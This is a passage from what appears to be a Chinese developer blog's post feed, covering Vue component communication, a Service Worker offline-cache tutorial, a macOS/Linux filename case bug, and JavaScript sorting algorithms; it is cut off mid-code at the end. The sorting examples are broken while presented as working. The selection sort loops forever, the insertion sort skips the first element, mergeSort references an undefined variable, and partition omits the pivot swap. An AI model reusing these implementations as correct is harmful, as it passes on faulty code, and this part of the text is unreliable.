class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v-model</span></span><br><span class="line">&lt;child v-model=<span class="string">"value"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// v-model等同于</span></span><br><span class="line">&lt;input :value=<span class="string">"value"</span> @input=<span class="string">"handlerChange"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// v-model多个值，可以自定义值（值不只是value）</span></span><br><span class="line">&lt;child :page.sync=<span class="string">"page"</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">&lt;input :page=<span class="string">"page"</span> @update:page=<span class="string">"v =&gt; page = v"</span> /&gt;</span><br><span class="line"><span class="keyword">this</span>.$emit(<span class="string">"update:page"</span>, newVal)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-attrs-listeners"><a href="#4-attrs-listeners" class="headerlink" title="4. $attrs/$listeners"></a>4. $attrs/$listeners</h3><p>多层嵌套组件传递数据时，如果只是传递数据，而不做中间处理的话就可以用这个，比如父组件向孙子组件传递数据时<br><code>$attrs</code>：包含父作用域里除 class 和 style 除外的非 props 属性集合<br><code>$listeners</code>：包含父作用域里 .native 除外的监听事件集合<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Parent.vue</span></span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;child :name=<span class="string">"name"</span> title=<span class="string">"1111"</span> &gt;<span class="xml"><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br><span class="line"><span class="regexp">export default&#123;</span></span><br><span class="line"><span class="regexp">    data()&#123;</span></span><br><span class="line"><span class="regexp">        return &#123;</span></span><br><span class="line"><span class="regexp">            name:"沐华"</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ Child.vue</span></span><br><span class="line"><span class="regexp">&lt;template&gt;</span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 继续传给孙子组件</span></span><br><span class="line"><span class="regexp">    &lt;sun-child v-bind="$attrs"&gt;&lt;/</span>sun-child&gt;</span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br><span class="line"><span class="regexp">export default&#123;</span></span><br><span class="line"><span class="regexp">    props:["name"], /</span><span class="regexp">/ 这里可以接收，也可以不接收</span></span><br><span class="line"><span class="regexp">    mounted()&#123;</span></span><br><span class="line"><span class="regexp">        /</span><span class="regexp">/ 如果props接收了name 就是 &#123; title:1111 &#125;，否则就是&#123; name:"沐华", title:1111 &#125;</span></span><br><span class="line"><span class="regexp">        console.log(this.$attrs)</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-parent-chilren-refs"><a href="#5-parent-chilren-refs" class="headerlink" title="5. $parent, $chilren, $refs"></a>5. $parent, $chilren, $refs</h3><p>在<code>this.$parent.children</code>中通过组件<code>name</code>查询到需要的组件实例，通过 ref 主动获取子组件的属性或者调用子组件的方法<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;child ref=<span class="string">"child"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child = <span class="keyword">this</span>.$refs.child</span><br><span class="line"><span class="built_in">console</span>.log(child.name) <span class="comment">// name是child的data</span></span><br><span class="line">child.someMethod(<span class="string">"调用了子组件的方法"</span>) <span class="comment">// someMethod是child的methods</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-provide-inject"><a href="#6-provide-inject" class="headerlink" title="6. provide/inject"></a>6. provide/inject</h3><p>Provide 可以在祖先组件中指定我们想要提供给后代组件的数据和方法，在任何后代组件中，我们都可以用 Inject 来接收 Provide 提供的数据和方法。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父组件</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">    <span class="comment">// 方法一 不能获取 this.xxx，只能传写死的</span></span><br><span class="line">    provide:&#123;</span><br><span class="line">        name:<span class="string">"沐华"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 方法二 可以获取 this.xxx</span></span><br><span class="line">    provide()&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            name:<span class="string">"沐华"</span>,</span><br><span class="line">            msg: <span class="keyword">this</span>.msg <span class="comment">// data 中的属性</span></span><br><span class="line">            someMethod:<span class="keyword">this</span>.someMethod <span class="comment">// methods 中的方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        someMethod()&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"这是注入的方法"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后代组件</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">    inject:[<span class="string">"name"</span>,<span class="string">"msg"</span>,<span class="string">"someMethod"</span>],</span><br><span class="line">    mounted()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.msg) <span class="comment">// 这里拿到的属性不是响应式的，如果需要拿到最新的，可以在下面的方法中返回</span></span><br><span class="line">        <span class="keyword">this</span>.someMethod()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-Event-Bus"><a href="#7-Event-Bus" class="headerlink" title="7. Event Bus"></a>7. Event Bus</h3><p>new一个Vue实例，作为事件总线，像是所有组件共用相同的事件中心，可以向该中心注册发送事件或接收事件， 所以组件都可以通知其他组件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Vue.prototype.bus = <span class="keyword">new</span> Vue();</span><br><span class="line">Vue.component(<span class="string">'child'</span>, &#123;</span><br><span class="line">  methods: &#123;</span><br><span class="line">    handleClick: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.bus.$emit(<span class="string">'change'</span>, <span class="string">'content'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.bus.$on(<span class="string">'change'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(msg); <span class="comment">// 'content'</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-Vuex"><a href="#7-Vuex" class="headerlink" title="7. Vuex"></a>7. Vuex</h3><p>初始化vuex的时候，新建了一个vue 实例<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123; <span class="attr">data</span>: &#123; <span class="attr">$store</span>: store &#125; &#125;)</span><br></pre></td></tr></table></figure></p><p>这里会给store设置get/set，然后把 store 挂到 Vue.prototype上，只要访问 this.$store.xxx就会收集依赖。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/store.js </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resetStoreVM</span> (<span class="params">store</span>) </span>&#123;</span><br><span class="line">  store._vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">      $$state: state</span><br><span class="line">    &#125;,</span><br><span class="line">    computed</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/53218851" target="_blank" rel="noopener">【Vue原理】Props - 白话版</a></li><li><a href="https://cn.vuejs.org/v2/guide/components-props.html" target="_blank" rel="noopener">Prop</a></li><li><a href="https://cn.vuejs.org/v2/guide/components-custom-events.html#sync-%E4%BF%AE%E9%A5%B0%E7%AC%A6" target="_blank" rel="noopener">.sync 修饰符</a></li><li><a href="https://juejin.cn/post/6844903887162310669#heading-11" target="_blank" rel="noopener">vue中8种组件通信方式</a></li><li><a href="https://www.jianshu.com/p/d95a7b8afa06" target="_blank" rel="noopener">vuex工作原理详解</a></li><li><a href="https://tech.meituan.com/2017/04/27/vuex-code-analysis.html" target="_blank" rel="noopener">Vuex框架原理与源码分析</a></li><li><a href="https://juejin.cn/post/6999687348120190983?searchId=2025030615330979E6E38D7849AE670496#heading-16" target="_blank" rel="noopener">Vue3的8种和Vue2的12种组件通信，值得收藏</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Service Worker 实现离线页面访问</title>
      <link href="/2021/08/20/ServiceWorker/"/>
      <url>/2021/08/20/ServiceWorker/</url>
      <content type="html"><![CDATA[<p>最近看Vue的官方文档的时候，发现没有网的时候，页面还是可以被刷出来，一看…恩，serviceWorker<br>我的博客也要来一套，走起~</p><p><img src="/2021/08/20/ServiceWorker/1.jpg" style="width: 500px"></p><p>先看看Vue是怎么实现的<br><a href="https://cn.vuejs.org/service-worker.js" target="_blank" rel="noopener">https://cn.vuejs.org/service-worker.js</a></p><p>要实现的效果</p><ul><li>请求资源成功，缓存进serviceWorker</li><li>没网的时候，浏览器从serviceWorker取出资源</li><li>资源更新时，会拉去新的资源</li><li>有一天不想用serviceWorker了，可以卸载</li></ul><p><br></p><h3 id="1-Service-Worker"><a href="#1-Service-Worker" class="headerlink" title="1. Service Worker"></a>1. Service Worker</h3><p>Service Worker采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。你可以完全控制应用在特定情形（最常见的情形是网络不可用）下的表现。</p><ul><li>Service worker运行在worker上下文，因此它不能访问DOM。</li><li>相对于驱动应用的主JavaScript线程，它运行在其他线程中，所以不会造成阻塞。</li><li>出于安全考量，Service workers只能由HTTPS承载，毕竟修改网络请求的能力暴露给中间人攻击会非常危险。</li><li>被install后就永远存在，除非被手动卸载</li></ul><p><br></p><h3 id="2-实现资源拦截"><a href="#2-实现资源拦截" class="headerlink" title="2. 实现资源拦截"></a>2. 实现资源拦截</h3><p>请求成功时，正常返回请求内容，将资源缓存起来。没网的时候返回缓存资源。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册Sevice worker</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"load"</span>, event =&gt; &#123;</span><br><span class="line">  <span class="comment">// 判断浏览器是否支持</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="string">"serviceWorker"</span> <span class="keyword">in</span> navigator) &#123;</span><br><span class="line">    <span class="built_in">window</span>.navigator.serviceWorker</span><br><span class="line">      .register(<span class="string">"/sw.js"</span>, &#123;</span><br><span class="line">        scope: <span class="string">"/"</span></span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 资源拦截</span></span><br><span class="line"><span class="keyword">const</span> VERSION = <span class="string">'1.0.0'</span></span><br><span class="line"><span class="keyword">this</span>.addEventListener(<span class="string">"fetch"</span>, event =&gt; &#123;</span><br><span class="line">  event.respondWith(</span><br><span class="line">    caches.match(event.request).then(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> request = event.request.clone();</span><br><span class="line">      <span class="keyword">return</span> fetch(request).then(<span class="function"><span class="params">httpRes</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// http请求的返回已被抓到，可以处置了。</span></span><br><span class="line">        <span class="comment">// 请求失败了，直接返回失败的结果就好了。。</span></span><br><span class="line">        <span class="keyword">if</span> (!httpRes || httpRes.status !== <span class="number">200</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> httpRes;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 请求成功的话，将请求缓存起来。</span></span><br><span class="line">        <span class="keyword">let</span> responseClone = httpRes.clone();</span><br><span class="line">        caches.open(VERSION).then(<span class="function"><span class="params">cache</span> =&gt;</span> &#123;</span><br><span class="line">          cache.put(event.request, responseClone);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> httpRes;</span><br><span class="line">      &#125;, err =&gt; &#123;</span><br><span class="line">        <span class="comment">// 如果 Service Workder 之前存储了该资源，返回该资源</span></span><br><span class="line">        <span class="keyword">if</span> (response) &#123;</span><br><span class="line">          <span class="keyword">return</span> response;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>断网了再刷新这个页面试试，可以了~</p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.cn/post/6844903906670018568" target="_blank" rel="noopener">Service Worker离线缓存实践</a></li><li><a href="https://zhuanlan.zhihu.com/p/115243059" target="_blank" rel="noopener">service worker 是什么？看这篇就够了</a></li><li><a href="https://cloud.tencent.com/developer/article/1617365" target="_blank" rel="noopener">Service Worker离线缓存实战</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>趣谈网络协议</title>
      <link href="/2021/08/20/%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
      <url>/2021/08/20/%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/</url>
      <content type="html"><![CDATA[]]></content>
      
      
    </entry>
    
    <entry>
      <title>mac系统不区分大小写，linux服务器区分大小写</title>
      <link href="/2021/08/20/Bug-%E5%A4%A7%E5%B0%8F%E5%86%99/"/>
      <url>/2021/08/20/Bug-%E5%A4%A7%E5%B0%8F%E5%86%99/</url>
      <content type="html"><![CDATA[<p>macOS 默认是不区分文件路径中的大小写的，而 Linux 系统一般是区分大小写的。<br>很多同学的开发环境都是 macOS ，而发布、部署环境都是 Linux 。</p><p>当你<code>import</code>一个文件<code>list.js</code>，但是写成了<code>List.js</code>，mac上是没有问题的。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> List <span class="keyword">from</span> <span class="string">'List'</span></span><br></pre></td></tr></table></figure></p><p>但代码push到linux编译机上就会报找不到<code>List.js</code>的错误。</p>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>排序</title>
      <link href="/2021/08/19/Leetcode-%E6%8E%92%E5%BA%8F/"/>
      <url>/2021/08/19/Leetcode-%E6%8E%92%E5%BA%8F/</url>
      <content type="html"><![CDATA[<h3 id="O-n²"><a href="#O-n²" class="headerlink" title="O(n²)"></a><code>O(n²)</code></h3><h3 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1. 冒泡排序"></a>1. 冒泡排序</h3><p>冒泡排序只会操作相邻的两个数据。每次冒泡操作都会对相邻的两个元素进行比较，看是否满足大小关系要求，如果不满足就让它俩互换。一次冒泡至少会让一个元素移动到它应在的位置，重复 n 次，就完成了 n 个数据的排序工作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]   <span class="comment">// 第一次遍历后，至少6会在正确的位置上</span></span><br><span class="line"><span class="keyword">const</span> bubbleSort = <span class="function"><span class="params">arr</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (arr.length &lt;= <span class="number">1</span>) <span class="keyword">return</span> arr</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> hasChange = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; arr.length - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="keyword">const</span> temp = arr[j]</span><br><span class="line">        arr[j] = arr[j + <span class="number">1</span>]</span><br><span class="line">        arr[j + <span class="number">1</span>] = temp</span><br><span class="line">        hasChange = <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!hasChange) <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/19/Leetcode-排序/1.gif"></p><p><br></p><h3 id="2-选择排序"><a href="#2-选择排序" class="headerlink" title="2. 选择排序"></a>2. 选择排序</h3><p>选择排序把数组中的数据分成前后两个区间，已排序区间和未排序区间。在未排序区间里找到最小元素，存放到已排序序列的末尾，以此类推，直到所有元素均排序完毕。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> selectionSort = <span class="function"><span class="params">arr</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> minIndex = i</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i; i &lt; arr.length; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[j] &lt; arr[minIndex]) &#123;</span><br><span class="line">        minIndex = j</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> temp = arr[i]</span><br><span class="line">    arr[i] = arr[minIndex]</span><br><span class="line">    arr[minIndex] = temp</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/08/19/Leetcode-排序/3.gif"></p><p><br></p><h3 id="3-插入排序"><a href="#3-插入排序" class="headerlink" title="3. 插入排序"></a>3. 插入排序</h3><p>插入排序将数组中的数据分为前后两个区间，已排序区间和未排序区间。初始已排序区间只有一个元素，就是数组的第一个元素。然后取未排序区间中的第一个元素，在已排序区间中找到合适的位置插入。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line"><span class="keyword">const</span> insertSort = <span class="function"><span class="params">arr</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    preIndex = i - <span class="number">1</span></span><br><span class="line">    current = arr[i]</span><br><span class="line">    <span class="keyword">while</span> (arr[preIndex] &gt; current &amp;&amp; preIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      arr[preIndex + <span class="number">1</span>] = arr[preIndex]</span><br><span class="line">      preIndex--</span><br><span class="line">    &#125;</span><br><span class="line">    arr[preIndex + <span class="number">1</span>] = current</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/08/19/Leetcode-排序/2.gif"><br><br></p><h3 id="O-nlogn"><a href="#O-nlogn" class="headerlink" title="O(nlogn)"></a><code>O(nlogn)</code></h3><h3 id="4-归并排序"><a href="#4-归并排序" class="headerlink" title="4. 归并排序"></a>4. 归并排序</h3><p>将已有序的子序列合并，得到完全有序的序列。再将两个有序的数组合并成一个有序的数组。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> len = arr.length</span><br><span class="line">  <span class="keyword">if</span> (len &lt; <span class="number">2</span>) <span class="keyword">return</span> arr</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> mid = <span class="built_in">Math</span>.floor(len / <span class="number">2</span>),</span><br><span class="line">        left = arr.slice(<span class="number">0</span>, middle),</span><br><span class="line">        right = arr.slice(middle)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span> (<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> result = []</span><br><span class="line">  <span class="keyword">while</span> (left.length &gt; <span class="number">0</span> &amp;&amp; right.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (left[<span class="number">0</span>] &lt; right[<span class="number">0</span>]) &#123;</span><br><span class="line">      result.push(left.shift())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.push(right.shift())</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (left.length) &#123;</span><br><span class="line">    result.push(left.shift())</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (right.length) &#123;</span><br><span class="line">    result.push(right.shift())</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/08/19/Leetcode-排序/4.gif"></p><p><br></p><h3 id="5-快速排序"><a href="#5-快速排序" class="headerlink" title="5. 快速排序"></a>5. 快速排序</h3><p>如果要排序数组中下标从 p 到 r 之间的一组数据，我们选择 p 到 r 之间的任意一个数据作为 privot (分区点)。我们遍历 p 到 r 之间的数据，将小于 pivot 的放到左边，将大于 pivot 的放到右边，将 pivot 放到中间。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quickSort</span> (<span class="params">arr, left, right</span>) </span>&#123;</span><br><span class="line">  left = <span class="keyword">typeof</span> left !== <span class="string">'number'</span> ? <span class="number">0</span> : left,</span><br><span class="line">  right = <span class="keyword">typeof</span> right !== <span class="string">'number'</span> ? arr.length - <span class="number">1</span> : right</span><br><span class="line"></span><br><span class="line">  <span class="keyword">debugger</span></span><br><span class="line">  <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">    <span class="keyword">const</span> partitionIndex = partition(arr, left, right)</span><br><span class="line">    quickSort(arr, left, partitionIndex - <span class="number">1</span>)</span><br><span class="line">    quickSort(arr, partitionIndex + <span class="number">1</span>, right)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">partition</span>(<span class="params">arr, left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> pivot = left, <span class="comment">// 基准点</span></span><br><span class="line">      index = pivot + <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = index; i &lt;= right; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] &lt; arr[pivot]) &#123;</span><br><span class="line">      swap(arr, i, index)</span><br><span class="line">      index++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> index - <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span 